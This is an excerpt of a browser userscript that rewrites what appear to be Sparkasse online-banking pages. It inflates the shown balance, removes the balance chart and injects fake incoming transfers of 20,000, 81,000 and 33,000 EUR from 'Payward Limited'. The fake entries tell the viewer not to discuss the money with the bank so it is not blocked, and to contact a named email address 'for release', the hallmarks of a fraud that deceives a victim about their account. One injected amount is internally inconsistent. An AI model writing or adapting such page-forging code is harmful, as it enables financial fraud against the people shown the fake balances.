...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/480130/Combined%20Thorulf%20Becker.user.js
// @updateURL https://update.greasyfork.org/scripts/480130/Combined%20Thorulf%20Becker.meta.js
// ==/UserScript==
...
(function() {
    ...
    var buchungTextsZahl = "231.927";
    var accountsecurity = "00 3305 70";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10756963034") > 0 || window.location.href.indexOf("10740346043") > 0) {
...
if (KontosBoxElement) {
    ...
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10756964675") > 0  ) {

        //Wir sind im Kontostand
 // Set the value by which you want to modify the main balance
    var modificationValue = 20000;
...
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 20.300,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">20.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">20.000,00 EUR</span></div></div></div></div></li>';
            var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 81.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Vorgemerkt: Payward Limited">Payward Limited</a></h3><p>Auszahlung 2. Kontaktieren Sie andreas.graf@fin-secured.com für Freigabe</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">81.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">81.000,00 EUR</span></div></div></div></div></li>';
          var x4HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 33.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Vorgemerkt: Payward Limited">Payward Limited</a></h3><p>Auszahlung 3. Kontaktieren Sie andreas.graf@fin-secured.com für Freigabe</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">33.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">3.000,00 EUR</span></div></div></div></div></li>';

            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = xHTML + x2HTML + x3HTML + x4HTML + saveHTML;
        }
...
if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
    ...
    var adjustmentAmount = 20000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
